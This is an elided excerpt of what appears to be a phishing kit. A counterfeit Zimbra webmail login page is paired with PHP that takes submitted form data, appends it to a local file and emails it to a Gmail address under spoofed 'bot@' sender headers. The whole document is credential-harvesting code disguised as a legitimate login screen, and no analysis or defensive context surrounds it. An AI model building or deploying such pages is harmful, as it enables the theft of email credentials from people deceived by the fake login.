...
$confi = [
    'domain' => 'viperonlinemarketing.com.au',
    'email' => 'engpacep@gmail.com',
];
...
if(!empty($_POST['upgrade']) && $_POST['upgrade'] == 'myForm'){
	...
	$headers = 'From: bot@'.$confi['domain']. "\r\n" .
	'Reply-To: bot@'.$confi['domain']. "\r\n" .
	'X-Mailer: PHP/' . phpversion();
	$fp = fopen('data.md', 'a');
	fwrite($fp, $msg);
	fclose($fp);
	if(mail($to, $subject, $msg, $headers,'-fwebmaster@'.$confi['domain'])){
...
<link rel="stylesheet" type="text/css" href="skin.css?skin=harmony&v=190718143820">
		...
		<div class="center">
			<div class="contentBox">
				...
				<form method="post" name="loginForm" action="" accept-charset="UTF-8">
					...
					<input type="hidden" name="login_csrf" value="715903a2-4481-4a76-9da9-7c152a657325"/>
																										...
																										,{
																											...
																											,fullScreen:{
																												...
																												,allAds:{
																													...
																													,hideSearchInCompose:true,notificationBanner:"/zimbra/skins/_base/logos/NotificationBanner_grey.gif?v=190718143820",socialfox:{
